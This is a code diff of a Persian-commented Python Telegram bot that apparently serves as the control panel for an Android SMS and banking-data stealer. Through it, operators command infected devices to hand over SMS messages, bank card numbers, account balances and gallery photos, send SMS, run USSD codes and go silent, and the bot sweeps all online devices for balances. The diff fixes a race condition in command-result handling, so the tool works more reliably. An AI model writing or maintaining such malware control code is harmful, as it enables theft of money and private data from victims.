@@ -30,6 +30,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # ============================================================
 # داده‌های موقت و متغیرهای سراسری
 # ============================================================
+
 temp_data = {}
 EXPIRE_TIME = 600
 COMMAND_RETRY_LIMIT = 20
@@ -47,6 +48,7 @@ pending_results = {}
 # ============================================================
 # توابع مدیریت داده‌های موقت
 # ============================================================
+
 def clean_expired_temp_data():
     now = time.time()
     keys_to_remove = []
@@ -98,12 +100,16 @@ def delete_temp_data(key):
 # ============================================================
 # کلاینت WebSocket (ارسال و دریافت تمام پیام‌ها)
 # ============================================================
+
 class WebSocketClient:
     def __init__(self, uri):
         self.uri = uri
         self.websocket = None
         self.loop = asyncio.new_event_loop()
         self.pending_requests = {}
+        # ★★★ FIX: ساختارهای جداگانه برای نتایج دستورات (جلوگیری از تداخل با pending_requests) ★★★
+        self.command_results = {}       # نتایج دستورات: str(command_id) -> data
+        self.expected_commands = set()  # شناسهٔ دستوراتی که منتظر نتیجه‌شان هستیم
         self.is_connected = False
         self.should_reconnect = True
         self.reconnect_delay = 3
@@ -164,31 +170,27 @@ class WebSocketClient:
                     data = json.loads(message)
                     msg_type = data.get('type')
                     logger.info(f"📥 Received WebSocket message: {msg_type}")
-                    
+
                     if msg_type == 'result':
+                        # ★★★ FIX: نتایج دستورات در command_results ذخیره می‌شوند (نه pending_requests) ★★★
                         command_id = data.get('command_id')
                         result_data = data.get('data')
                         set_code = data.get('set_code')
-                        
-                        # بررسی اینکه آیا شناسه دستور در دایرکتوری‌های معلق ربات هست
-                        # هم به صورت عدد (که از پایتون تولید شده) هم رشته
-                        found_target = False
-                        for cid in list(self.pending_requests.keys()):
-                            if str(cid) == str(command_id):
-                                self.pending_requests[cid]['result'] = result_data
-                                self.pending_requests[cid]['received'] = True
-                                found_target = True
-                                break
-                                
-                        if not_found_target := not found_target:
-                            # نتیجه خودکار - ارسال به گروه
+                        key = str(command_id)
+
+                        if key in self.expected_commands:
+                            # نتیجهٔ دستوری که خود ربات فرستاده → ذخیره برای poller
+                            self.command_results[key] = result_data
+                            logger.info(f"📥 Result stored for command {command_id}")
+                        else:
+                            # نتیجهٔ خودکار/بدون درخواست (مثلاً دستور از راه SMS) → ارسال مستقیم به گروه
                             inferred_type = infer_command_type(result_data)
                             threading.Thread(
                                 target=send_result_to_group,
                                 args=(inferred_type or "UNKNOWN", command_id, set_code, result_data),
                                 daemon=True
                             ).start()
-                            
+
                     elif msg_type == 'notification':
                         notif_data = data.get('data')
                         if notif_data:
@@ -197,31 +199,31 @@ class WebSocketClient:
                                 target=process_pending_notifications,
                                 daemon=True
                             ).start()
-                            
+
                     elif msg_type == 'device_info':
                         set_code = data.get('set_code')
                         device = data.get('device')
                         if set_code in self.pending_requests:
                             self.pending_requests[set_code]['device'] = device
                             self.pending_requests[set_code]['received'] = True
-                            
+
                     elif msg_type == 'online_devices':
                         devices = data.get('devices', [])
                         if 'online_devices' in self.pending_requests:
                             self.pending_requests['online_devices']['devices'] = devices
                             self.pending_requests['online_devices']['received'] = True
-                            
+
                     elif msg_type == 'stats':
                         stats = data.get('stats', {})
                         if 'stats' in self.pending_requests:
                             self.pending_requests['stats']['data'] = stats
                             self.pending_requests['stats']['received'] = True
-                            
+
                     elif msg_type == 'success':
                         action = data.get('action')
                         command_id = data.get('command_id')
                         set_code = data.get('set_code')
-                        
+
                         # پیدا کردن target_id مناسب
                         target_id = None
                         if command_id and command_id in self.pending_requests:
@@ -230,7 +232,7 @@ class WebSocketClient:
                             target_id = set_code
                         elif action and action in self.pending_requests:
                             target_id = action
-                            
+
                         if target_id:
                             self.pending_requests[target_id]['success'] = True
                             for key, val in data.items():
@@ -247,13 +249,13 @@ class WebSocketClient:
                                 'action': action,
                                 'received': True
                             }
-                            
+
                     elif msg_type == 'error':
                         error_msg = data.get('message', 'Unknown error')
                         action = data.get('action')
                         command_id = data.get('command_id')
                         set_code = data.get('set_code')
-                        
+
                         target_id = None
                         if command_id and command_id in self.pending_requests:
                             target_id = command_id
@@ -261,7 +263,7 @@ class WebSocketClient:
                             target_id = set_code
                         elif action and action in self.pending_requests:
                             target_id = action
-                            
+
                         if target_id:
                             self.pending_requests[target_id]['error'] = error_msg
                             self.pending_requests[target_id]['received'] = True
@@ -272,16 +274,16 @@ class WebSocketClient:
                                 'error': error_msg,
                                 'received': True
                             }
-                            
+
                     elif msg_type == 'all_devices':
                         devices = data.get('devices', [])
                         if 'all_devices' in self.pending_requests:
                             self.pending_requests['all_devices']['devices'] = devices
                             self.pending_requests['all_devices']['received'] = True
-                            
+
                     else:
                         logger.warning(f"Unknown message type: {msg_type}")
-                        
+
                 except json.JSONDecodeError:
                     logger.error(f"Invalid JSON received: {message[:200]}")
                 except Exception as e:
@@ -297,23 +299,24 @@ class WebSocketClient:
             logger.warning("WebSocket not connected. Trying to reconnect...")
             await asyncio.sleep(2)
             return {'error': 'not_connected'}
-            
-        if 'set_code' in kwargs:
-            request_id = kwargs['set_code']
-        elif 'command_id' in kwargs:
+
+        # ★★★ FIX: اولویت با command_id است (نه set_code) تا add_command روی کلید درست منتظر بماند ★★★
+        if 'command_id' in kwargs:
             request_id = kwargs['command_id']
+        elif 'set_code' in kwargs:
+            request_id = kwargs['set_code']
         else:
             request_id = request_type
-            
+
         self.pending_requests[request_id] = {'received': False}
-        
+
         try:
             await self.websocket.send(json.dumps({
                 'type': request_type,
                 **kwargs
             }))
             logger.info(f"📤 Sent {request_type} request: {kwargs}")
-            
+
             start = time.time()
             while not self.pending_requests[request_id]['received']:
                 if time.time() - start > timeout:
@@ -325,7 +328,7 @@ class WebSocketClient:
                             pass
                     return {'error': 'timeout'}
                 await asyncio.sleep(0.1)
-                
+
             # دریافت ایمن دیتا در زمان رقابت همزمانی
             response = self.pending_requests.get(request_id, {'error': 'overwritten_or_deleted'})
             if request_id in self.pending_requests:
@@ -334,7 +337,7 @@ class WebSocketClient:
                 except KeyError:
                     pass
             return response
-            
+
         except Exception as e:
             logger.error(f"Error sending request: {e}")
             if request_id in self.pending_requests:
@@ -374,6 +377,7 @@ ws_client = WebSocketClient(WEBSOCKET_URL)
 # ============================================================
 # شروع WebSocket در thread جداگانه
 # ============================================================
+
 def start_websocket():
     ws_client.start()
 websocket_thread = threading.Thread(target=start_websocket, daemon=True)
@@ -382,6 +386,7 @@ websocket_thread.start()
 # ============================================================
 # پردازش نوتیفیکیشن‌های معلق
 # ============================================================
+
 def process_pending_notifications():
     global is_processing_notification
     if is_processing_notification:
@@ -400,18 +405,19 @@ def process_pending_notifications():
 # ============================================================
 # توابع کمکی برای ارسال درخواست‌ها
 # ============================================================
+
 def get_device_info(set_code, bypass_cache=False):
     if not set_code:
         return None
-    # ★ Pry-بررسی کش محلی در لحظه اول برای حذف درخواست‌های مکرر همزمان و افزایش بازدهی رم
+    # بررسی کش محلی در لحظه اول برای حذف درخواست‌های مکرر همزمان و افزایش بازدهی رم
     if not bypass_cache and set_code in device_cache:
         return device_cache[set_code]
-        
+
     response = ws_client.send_sync('get_device', timeout=35, set_code=set_code)
     if response.get('error'):
         logger.error(f"Error getting device info: {response}")
         return device_cache.get(set_code) # بازگشت به مقدار کش در صورت خطا
-        
+
     device = response.get('device')
     if device:
         device_cache[set_code] = device # ذخیره در کش
@@ -447,7 +453,7 @@ def add_command(set_code, command_type, params=None, command_id=None):
     if response.get('error'):
         logger.error(f"Error adding command: {response}")
         return None
-    return response.get('command_id')
+    return response.get('command_id') or command_id
 
 def update_nickname(set_code, nickname):
     if not set_code:
@@ -460,7 +466,7 @@ def update_nickname(set_code, nickname):
             device_cache[set_code]['nickname'] = nickname
     return success
 
-# ★ Pry-deprecated methods keeping for backward compatibility
+# deprecated methods keeping for backward compatibility
 def get_result(command_id):
     logger.warning("get_result is deprecated in new real-time architecture")
     return None
@@ -489,6 +495,7 @@ def register_device(device_data):
 # ============================================================
 # توابع کمکی (فرمت‌دهی، escape، و...)
 # ============================================================
+
 def escape_html(text):
     if not text:
         return ""
@@ -532,6 +539,7 @@ def get_sim_label(sim_slot, sim_map):
 # ============================================================
 # توابع تشخیص نوع نتیجه از روی محتوا
 # ============================================================
+
 def infer_command_type(result_data):
     if not isinstance(result_data, dict):
         return None
@@ -574,6 +582,7 @@ def infer_command_type(result_data):
 # ============================================================
 # توابع ارسال فایل
 # ============================================================
+
 def send_as_file(chat_id, content, filename, caption, set_code=None):
     try:
         with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False, encoding='utf-8') as tmp_file:
@@ -637,12 +646,13 @@ def generate_apps_file_content(apps):
 # ============================================================
 # قالب‌بندی نتایج
 # ============================================================
+
 def format_result(command_type, result_data, device_name, set_code):
     sim_map = get_sim_info_map(set_code)
     if not result_data:
         return "❌ نتیجه‌ای دریافت نشد."
-        
-    # ★ Pry-قالب‌بندی PING با محاسبه دقیق تاخیر زمانی رفت و برگشت
+
+    # قالب‌بندی PING با محاسبه دقیق تاخیر زمانی رفت و برگشت
     if command_type == "PING":
         send_time = result_data.get('send_time', 0)
         receive_time = result_data.get('receive_time', 0)
@@ -650,19 +660,19 @@ def format_result(command_type, result_data, device_name, set_code):
             ping_ms = int((receive_time - send_time) * 1000)
         else:
             ping_ms = 0
-            
+
         msg = f"<b>⚡️ PING RESULT</b>\n"
         msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
-        
+
         # نمایش وضعیت موفقیت و تاخیر پینگ میلی ثانیه در یک خط
         success_val = result_data.get('success', True) or result_data.get('status') == 'pong'
         status_icon = "🟢 Success" if success_val else "🔴 Failed"
         msg += f"📈 Status: <code>{status_icon}</code> (ping {ping_ms} ms)\n"
-        
+
         msg += f"🕒 Sent: <code>{time.strftime('%H:%M:%S', time.localtime(send_time)) if send_time else 'N/A'}</code>\n"
         msg += f"🕒 Received: <code>{time.strftime('%H:%M:%S', time.localtime(receive_time)) if receive_time else 'N/A'}</code>"
         return msg
-        
+
     if command_type == "GET_LAST_SMS":
         last = result_data.get("last_sms", {})
         address = escape_html(last.get("address", "نامشخص"))
@@ -676,7 +686,7 @@ def format_result(command_type, result_data, device_name, set_code):
         msg += f"━━━━━━━━━━━━━━━\n"
         msg += f"💬 Message:\n<pre>{body}</pre>"
         return msg
-        
+
     if command_type == "GET_USER_NUMBER":
         numbers = result_data.get("numbers", [])
         count = result_data.get("count", 0)
@@ -691,7 +701,7 @@ def format_result(command_type, result_data, device_name, set_code):
         else:
             msg += "❌ شماره‌ای یافت نشد."
         return msg
-        
+
     if command_type == "GET_BALANCES":
         balances = result_data.get("balances", [])
         count = result_data.get("count", 0)
@@ -704,14 +714,14 @@ def format_result(command_type, result_data, device_name, set_code):
                 amount = b.get("amount", 0)
                 sender = escape_html(b.get("sender", "نامشخص"))
                 raw = b.get("raw_message", "")
-                
+
                 try:
                     if isinstance(amount, str):
                         amount = amount.replace(",", "")
                     amount_formatted = f"{int(float(amount)):,}"
                 except Exception:
                     amount_formatted = str(amount)
-                    
+
                 msg += f"🏦 {bank}\n   💰 {amount_formatted} ریال\n   📞 {sender}\n"
                 if raw:
                     msg += f"   📝 متن: {escape_html(raw)}\n"
@@ -719,7 +729,7 @@ def format_result(command_type, result_data, device_name, set_code):
         else:
             msg += "❌ هیچ موجودی یافت نشد."
         return msg
-        
+
     if command_type == "GET_CARDS":
         cards = result_data.get("cards", [])
         count = result_data.get("count", 0)
@@ -734,7 +744,7 @@ def format_result(command_type, result_data, device_name, set_code):
         else:
             msg += "❌ هیچ شماره کارتی یافت نشد."
         return msg
-        
+
     if command_type == "GET_USSD":
         response = result_data.get("response", "پاسخی دریافت نشد")
         code = escape_html(result_data.get("ussd_code", "نامشخص"))
@@ -746,7 +756,7 @@ def format_result(command_type, result_data, device_name, set_code):
         msg += f"🔢 Code: <code>{code}</code>\n━━━━━━━━━━━━━━━\n"
         msg += f"💬 Response:\n<pre>{response}</pre>"
         return msg
-        
+
     if command_type == "SEND_SMS":
         sent_to = escape_html(result_data.get("sent_to", "نامشخص"))
         message = escape_html(result_data.get("message", "متن پیام خالی است"))
@@ -758,7 +768,7 @@ def format_result(command_type, result_data, device_name, set_code):
         msg += f"📶 SIM: <code>{sim_label}</code>\n━━━━━━━━━━━━━━━\n"
         msg += f"💬 Message:\n<pre>{message}</pre>"
         return msg
-        
+
     if command_type in ["SILENT_MODE", "NORMAL_MODE"]:
         status = result_data.get("status", "نامشخص")
         mode = "🔇 Silent" if command_type == "SILENT_MODE" else "🔊 Normal"
@@ -767,7 +777,7 @@ def format_result(command_type, result_data, device_name, set_code):
         msg += f"📊 Status: <code>{status}</code>\n"
         msg += f"💬 {escape_html(result_data.get('message', ''))}"
         return msg
-        
+
     if command_type == "GET_BATTERY":
         battery = result_data.get("battery_percentage", 0)
         charging = result_data.get("is_charging", False)
@@ -778,35 +788,36 @@ def format_result(command_type, result_data, device_name, set_code):
         msg += f"📊 Status: {status}"
         return msg
 
-    # ★ Pry-قالب‌بندی کاملاً عمومی و شکیل برای سایر دستورات فرعی یا جدید (بدون فرستادن جیسون خام)
+    # قالب‌بندی کاملاً عمومی و شکیل برای سایر دستورات فرعی یا جدید (بدون فرستادن جیسون خام)
     msg = f"<b>📊 {command_type} RESULT</b>\n"
     msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
     msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     success_status = result_data.get('success', True) or result_data.get('status') == 'success'
     msg += f"📈 Status: <code>{'🟢 Success' if success_status else '🔴 Failed'}</code>\n"
-    
+
     has_data_keys = False
     for k, v in result_data.items():
         if k not in ['type', 'command_id', 'set_code', 'success', 'status', 'send_time', 'receive_time']:
             has_data_keys = True
             clean_key = k.replace('_', ' ').capitalize()
             msg += f"🔹 {escape_html(clean_key)}: <code>{escape_html(v)}</code>\n"
-            
+
     if not has_data_keys and 'message' in result_data:
         msg += f"💬 Message: <code>{escape_html(result_data.get('message', ''))}</code>\n"
-        
+
     return msg
 
 # ============================================================
 # قالب‌بندی نوتیفیکیشن‌ها
 # ============================================================
+
 def format_app_install_notification(data, device_name, set_code):
     app_name = escape_html(data.get("app_name", "نامشخص"))
     package_name = escape_html(data.get("package_name", "نامشخص"))
     android_version = escape_html(data.get("android_version", "نامشخص"))
     battery = data.get("battery", "N/A")
     permissions = data.get("granted_permissions", [])
-    
+
     msg = f"<b>📲 نصب برنامه جدید</b>\n"
     msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
     msg += f"📌 App: <code>{app_name}</code>\n"
@@ -815,7 +826,7 @@ def format_app_install_notification(data, device_name, set_code):
     msg += f"🔋 Battery: <code>{battery}%</code>\n"
     if permissions:
         msg += f"🔐 Permissions: {', '.join([escape_html(p) for p in permissions])}\n"
-    
+
     balance_data = data.get("balance")
     if balance_data and isinstance(balance_data, dict):
         if balance_data.get("message"):
@@ -839,7 +850,7 @@ def format_app_install_notification(data, device_name, set_code):
                 msg += f"\n💰 کاربر دسترسی SMS نداده است\n"
     else:
         msg += f"\n💰 کاربر دسترسی SMS نداده است\n"
-    
+
     return msg
 
 def format_new_sms_notification(data, device_name, set_code):
@@ -914,6 +925,7 @@ def format_bank_sms_result(raw_result, display_name, set_code):
 # ============================================================
 # ارسال نوتیفیکیشن به گروه
 # ============================================================
+
 def send_notification_to_group(notification):
     try:
         notif_id = notification.get('id')
@@ -928,9 +940,9 @@ def send_notification_to_group(notification):
             message = format_new_sms_notification(notif_data, device_name, set_code)
         else:
             raw_message = (
-                notification.get('message') or 
-                (notification.get('data') if isinstance(notification.get('data'), str) else None) or 
-                (notification.get('data', {}).get('message') if isinstance(notification.get('data'), dict) else None) or 
+                notification.get('message') or
+                (notification.get('data') if isinstance(notification.get('data'), str) else None) or
+                (notification.get('data', {}).get('message') if isinstance(notification.get('data'), dict) else None) or
                 '📢 New notification'
             )
             if "Device:" not in raw_message and device_name:
@@ -948,6 +960,7 @@ def send_notification_to_group(notification):
 # ============================================================
 # صفحه‌کلیدها
 # ============================================================
+
 def main_menu_keyboard():
     keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
     keyboard.add(
@@ -1024,6 +1037,7 @@ def sim_selection_keyboard(set_code, sim_info, action_type, extra_params=None):
 # ============================================================
 # تابع کمکی برای ویرایش/ارسال پیام
 # ============================================================
+
 def safe_edit_or_send(chat_id, text, edit_message_id=None, parse_mode='HTML', reply_markup=None):
     if edit_message_id:
         try:
@@ -1037,7 +1051,7 @@ def safe_edit_or_send(chat_id, text, edit_message_id=None, parse_mode='HTML', re
             logger.warning(f"Failed to edit message {edit_message_id}, falling back to sending: {e}")
         except Exception as e:
             logger.warning(f"Failed to edit message {edit_message_id}, falling back to sending: {e}")
-            
+
     try:
         bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
     except Exception as e:
@@ -1046,6 +1060,7 @@ def safe_edit_or_send(chat_id, text, edit_message_id=None, parse_mode='HTML', re
 # ============================================================
 # نمایش اطلاعات دستگاه
 # ============================================================
+
 def show_device_info(chat_id, set_code, edit_message_id=None):
     if not set_code.startswith("SET_"):
         msg = "❌ Invalid device code."
@@ -1064,10 +1079,10 @@ def show_device_info(chat_id, set_code, edit_message_id=None):
     if nickname:
         msg += f"📛 Device Name: <code>{escape_html(device_name)}</code>\n"
     msg += f"🔑 Code: <code>{escape_html(device.get('set_code', ''))}</code>\n"
-    
+
     status = device.get('status', 'offline')
     status_icon = "🟢 Online" if status == "online" else "🔴 Offline"
-    
+
     msg += f"📶 Status: {status_icon}\n"
     msg += f"🔋 Battery: {device.get('battery', 'N/A')}%\n"
     msg += f"📡 IP: {escape_html(device.get('ip', 'N/A'))}\n"
@@ -1086,71 +1101,52 @@ def show_device_info(chat_id, set_code, edit_message_id=None):
 # ارسال دستور به دستگاه (با timeout بیشتر)
 # ============================================================
 def send_command_to_device(chat_id, set_code, command_type, params=None, edit_message_id=None):
-    # ★ Pry-پیش‌تولید کاملاً هماهنگ شناسه دستور قبل از فرستادن به وب‌سوکت جهت رفع تداخل همزمانی میلی‌ثانیه‌ای (Race Condition)
+    # ★★★ FIX: تولید شناسهٔ دستور و ثبت آن در expected_commands (نه pending_requests) ★★★
     command_id = int(time.time() * 1000)
-    
-    # ★★★ برای PING، زمان ارسال دقیق ربات را ذخیره کن ★★★
+
+    # برای PING، زمان ارسال دقیق ربات را ذخیره کن
     if command_type == "PING":
         send_time = time.time()
         if params is None:
             params = {}
         params['send_time'] = send_time
-        
-    # ★ Pry-ثبت دستی و فوری شناسه در دایرکتوری در حال انتظار قبل از ارسال پیام وب‌سوکت
-    ws_client.pending_requests[command_id] = {
-        'received': False, 
-        'command_type': command_type, 
-        'chat_id': chat_id, 
-        'edit_message_id': edit_message_id
-    }
-    
+
+    # ثبت به‌عنوان دستور مورد انتظار (قبل از ارسال، برای جلوگیری از race condition)
+    ws_client.expected_commands.add(str(command_id))
+
     sent_command_id = add_command(set_code, command_type, params, command_id=command_id)
     if not sent_command_id:
         msg = f"❌ Failed to send command <code>{command_type}</code>."
         safe_edit_or_send(chat_id, msg, edit_message_id)
-        # تمیزکاری کش در صورت شکست ارسال اولیه
-        try:
-            del ws_client.pending_requests[command_id]
-        except KeyError:
-            pass
+        # تمیزکاری در صورت شکست ارسال اولیه
+        ws_client.expected_commands.discard(str(command_id))
         return False
-        
+
     msg = f"⚡ Command <code>{command_type}</code> sent to <code>{set_code}</code>."
     safe_edit_or_send(chat_id, msg, edit_message_id)
-    
+
     def check_and_send_result():
-        # بررسی سریع‌تر ثانیه‌ای برای پاسخ آنی بدون تاخیر ۶۰ ثانیه‌ای
+        # ★★★ FIX: نتیجه از command_results خوانده می‌شود (نه pending_requests) ★★★
+        key = str(command_id)
         retry_limit = (GALLERY_RETRY_LIMIT if command_type == "GET_GALLERY" else COMMAND_RETRY_LIMIT) * 3
         for attempt in range(retry_limit):
             time.sleep(1)
-            
-            found_req = None
-            # جستجو هم به صورت کلید رشته‌ای هم عددی
-            for cid in list(ws_client.pending_requests.keys()):
-                if str(cid) == str(command_id):
-                    found_req = ws_client.pending_requests[cid]
-                    break
-                    
-            if found_req and found_req.get('received'):
-                result_data = found_req.get('result')
-                if result_data is not None:
-                    # برای دستور PING، زمان دریافت را ثبت کن
-                    if command_type == "PING":
-                        if isinstance(result_data, dict):
-                            result_data['receive_time'] = time.time()
-                            # ارسال زمان دقیق ارسال ربات (اگر در params ذخیره شده بود)
-                            if params and 'send_time' in params:
-                                result_data['send_time'] = params['send_time']
-                    
-                    send_result_to_group(command_type, command_id, set_code, result_data)
-                    
-                    # تمیزکاری کش درخواست‌ها جهت مصرف بهینه رم سیستم‌های ضعیف
-                    try:
-                        del ws_client.pending_requests[command_id]
-                    except KeyError:
-                        pass
-                    return
-                        
+
+            result_data = ws_client.command_results.get(key)
+            if result_data is not None:
+                # برای دستور PING، زمان دریافت را ثبت کن
+                if command_type == "PING" and isinstance(result_data, dict):
+                    result_data['receive_time'] = time.time()
+                    if params and 'send_time' in params:
+                        result_data['send_time'] = params['send_time']
+
+                send_result_to_group(command_type, command_id, set_code, result_data)
+
+                # تمیزکاری کش
+                ws_client.command_results.pop(key, None)
+                ws_client.expected_commands.discard(key)
+                return
+
             if attempt == retry_limit - 1:
                 logger.warning(f"Result for command {command_id} not found after timeout.")
                 device_name = get_display_name(set_code)
@@ -1164,41 +1160,38 @@ def send_command_to_device(chat_id, set_code, command_type, params=None, edit_me
                     bot.send_message(GROUP_CHAT_ID, error_msg, parse_mode='HTML')
                 except:
                     pass
-                try:
-                    del ws_client.pending_requests[command_id]
-                except KeyError:
-                    pass
-                
+                ws_client.command_results.pop(key, None)
+                ws_client.expected_commands.discard(key)
+
     threading.Thread(target=check_and_send_result, daemon=True).start()
     return True
 
 # ============================================================
 # ارسال نتیجه به گروه
 # ============================================================
+
 def send_result_to_group(command_type, command_id, set_code, result_data=None):
     try:
         # اگر command_type ارسال نشده بود، نوع آن را هوشمندانه حدس بزن
         if command_type is None and result_data:
             command_type = infer_command_type(result_data) or "UNKNOWN"
-            
+
         if result_data is None:
-            if command_id and command_id in ws_client.pending_requests:
-                req = ws_client.pending_requests.get(command_id)
-                if req and req.get('received'):
-                    result_data = req.get('result')
+            key = str(command_id)
+            result_data = ws_client.command_results.get(key)
             if result_data is None:
                 logger.warning(f"No result data for command {command_id}")
                 return False
-                
+
         device_name = get_display_name(set_code)
         raw_result = result_data
-        
+
         # تکمیل مقادیر پینگ در صورت پردازش
         if command_type == "PING" and isinstance(raw_result, dict):
             if 'receive_time' not in raw_result:
                 raw_result['receive_time'] = time.time()
-                
-            # در صورتی که زمان ارسال از command_id استخراج نشده و در result_data نباشد، تلاش برای استخراج از command_id
+
+            # در صورتی که زمان ارسال در result_data نباشد، تلاش برای استخراج از command_id
             if 'send_time' not in raw_result and command_id:
                 try:
                     cid_val = float(command_id)
@@ -1208,13 +1201,13 @@ def send_result_to_group(command_type, command_id, set_code, result_data=None):
                         raw_result['send_time'] = cid_val
                 except Exception:
                     pass
-        
+
         # GET_GALLERY
         if command_type == "GET_GALLERY":
             urls = raw_result.get("urls", [])
             total = raw_result.get("total", 0)
             uploaded = raw_result.get("uploaded", 0)
-            
+
             if not urls:
                 msg = f"<b>🖼️ GALLERY RESULT</b>\n"
                 msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
@@ -1243,7 +1236,7 @@ def send_result_to_group(command_type, command_id, set_code, result_data=None):
             ))
             if set_code:
                 msg += f"\n🔑 /{set_code}"
-            
+
             bot.send_message(
                 GROUP_CHAT_ID,
                 msg,
@@ -1364,13 +1357,14 @@ def send_result_to_group(command_type, command_id, set_code, result_data=None):
 # ============================================================
 # پردازش درخواست‌های Request All
 # ============================================================
+
 def process_request_all(chat_id, message_id, command_type):
     command_map = {
         'BALANCES': 'GET_BALANCES',
         'PHONE_NUMBERS': 'GET_USER_NUMBER'
     }
     real_command = command_map.get(command_type, command_type)
-    
+
     devices = get_online_devices()
     total = len(devices)
     if not devices:
@@ -1380,35 +1374,31 @@ def process_request_all(chat_id, message_id, command_type):
     sent_count = 0
     failed_count = 0
     for d in devices:
-        command_id = add_command(d['set_code'], real_command)
-        if command_id:
+        # ★★★ FIX: تولید command_id یکتا برای هر دستگاه (جلوگیری از collision در حلقهٔ سریع) ★★★
+        command_id = int(time.time() * 1000)
+        while str(command_id) in ws_client.expected_commands:
+            command_id += 1
+        ws_client.expected_commands.add(str(command_id))
+
+        returned_id = add_command(d['set_code'], real_command, command_id=command_id)
+        if returned_id:
             sent_count += 1
             set_code = d['set_code']
-            
-            # ثبت شناسه موقت دستور در ربات برای دریافت نتیجه Real-time
-            ws_client.pending_requests[command_id] = {
-                'received': False, 
-                'command_type': real_command, 
-                'chat_id': chat_id, 
-                'edit_message_id': message_id
-            }
-            
+
             def check_and_send_result(cmd_id, s_code):
+                key = str(cmd_id)
                 for attempt in range(COMMAND_RETRY_LIMIT):
                     time.sleep(1)
-                    if cmd_id in ws_client.pending_requests:
-                        req = ws_client.pending_requests.get(cmd_id)
-                        if req and req.get('received'):
-                            result_data = req.get('result')
-                            if result_data is not None:
-                                send_result_to_group(real_command, cmd_id, s_code, result_data)
-                                if cmd_id in ws_client.pending_requests:
-                                    del ws_client.pending_requests[cmd_id]
-                                return
+                    result_data = ws_client.command_results.get(key)
+                    if result_data is not None:
+                        send_result_to_group(real_command, cmd_id, s_code, result_data)
+                        ws_client.command_results.pop(key, None)
+                        ws_client.expected_commands.discard(key)
+                        return
                 logger.warning(f"Result for command {cmd_id} not found after timeout.")
-                if cmd_id in ws_client.pending_requests:
-                    del ws_client.pending_requests[cmd_id]
-                    
+                ws_client.command_results.pop(key, None)
+                ws_client.expected_commands.discard(key)
+
             threading.Thread(
                 target=check_and_send_result,
                 args=(command_id, set_code),
@@ -1416,6 +1406,7 @@ def process_request_all(chat_id, message_id, command_type):
             ).start()
         else:
             failed_count += 1
+            ws_client.expected_commands.discard(str(command_id))
             logger.warning(f"Failed to send command to {d['set_code']}")
     summary_msg = f"✅ Command <code>{real_command}</code> sent to <b>{sent_count}</b> out of <b>{total}</b> online devices."
     if failed_count > 0:
@@ -1430,6 +1421,7 @@ def process_request_all(chat_id, message_id, command_type):
 # ============================================================
 # پردازش تنظیم نیک‌نام
 # ============================================================
+
 def process_set_nickname(message, set_code, original_message_id):
     chat_id = message.chat.id
     nickname = message.text.strip()
@@ -1449,6 +1441,7 @@ def process_set_nickname(message, set_code, original_message_id):
 # ============================================================
 # توابع دیالوگ
 # ============================================================
+
 def normalize_phone_number(number):
     clean = number.strip()
     if clean.startswith("+98"):
@@ -1532,7 +1525,7 @@ def process_sms_history_number(message, set_code, original_message_id):
             return
     else:
         clean_number = number
-        
+
     send_command_to_device(chat_id, set_code, "GET_SMS_BY_NUMBER", params={"phoneNumber": clean_number}, edit_message_id=original_message_id)
     time.sleep(1)
     show_device_info(chat_id, set_code)
@@ -1544,6 +1537,7 @@ def process_sms_history_number(message, set_code, original_message_id):
 # ============================================================
 # هندلرها
 # ============================================================
+
 @bot.message_handler(func=lambda message: message.text and re.match(r'^/SET_([A-Z0-9]+)(?:@[a-zA-Z0-9_]+)?$', message.text.strip()))
 def handle_set_command(message):
     match = re.match(r'^/SET_([A-Z0-9]+)(?:@[a-zA-Z0-9_]+)?$', message.text.strip())
@@ -1568,6 +1562,7 @@ def start(message):
 # ============================================================
 # Callback Handler
 # ============================================================
+
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id
@@ -1679,7 +1674,7 @@ def callback_handler(call):
         temp_key = f"{set_code}_{action_type}"
         extra_params = get_temp_data(temp_key) or {}
         delete_temp_data(temp_key)
-        
+
         if action_type == "send_sms":
             number = extra_params.get('number')
             text = extra_params.get('text')
@@ -1692,7 +1687,7 @@ def callback_handler(call):
             time.sleep(1)
             show_device_info(chat_id, set_code, edit_message_id=message_id)
             return
-            
+
         if action_type == "ussd":
             code = extra_params.get('code')
             if not code:
@@ -1704,7 +1699,7 @@ def callback_handler(call):
             time.sleep(1)
             show_device_info(chat_id, set_code, edit_message_id=message_id)
             return
-            
+
         if action_type == "sms_history":
             number = extra_params.get('number')
             if not number:
@@ -1715,7 +1710,7 @@ def callback_handler(call):
             time.sleep(1)
             show_device_info(chat_id, set_code, edit_message_id=message_id)
             return
-            
+
         safe_edit_or_send(chat_id, "❌ Action type unknown.", message_id, parse_mode='HTML')
         show_device_info(chat_id, set_code, edit_message_id=message_id)
         return
@@ -1727,28 +1722,28 @@ def callback_handler(call):
             return
         set_code = parts[1] + '_' + parts[2]
         command_type = parts[3]
-        
+
         if command_type == "GET_GALLERY":
             send_command_to_device(chat_id, set_code, command_type, edit_message_id=message_id)
             time.sleep(1)
             show_device_info(chat_id, set_code, edit_message_id=message_id)
             return
-            
+
         if command_type == "SET_NICKNAME":
             msg = bot.edit_message_text(f"✏️ Please enter a new nickname for device <code>{set_code}</code>:\n(Leave empty to clear nickname)", chat_id, message_id, parse_mode='HTML')
             bot.register_next_step_handler(msg, process_set_nickname, set_code, message_id)
             return
-            
+
         if command_type == "SEND_SMS":
             msg = bot.edit_message_text(f"📨 Please enter the destination number for sending SMS from device <code>{set_code}</code>:\n(Example: 09123456789)", chat_id, message_id, parse_mode='HTML')
             bot.register_next_step_handler(msg, process_send_sms_number, set_code, message_id)
             return
-            
+
         if command_type == "GET_USSD":
             msg = bot.edit_message_text(f"📟 Please enter the USSD code for device <code>{set_code}</code>:\n(Example: *140*11#)", chat_id, message_id, parse_mode='HTML')
             bot.register_next_step_handler(msg, process_ussd_code, set_code, message_id)
             return
-            
+
         if command_type == "GET_SMS_BY_NUMBER":
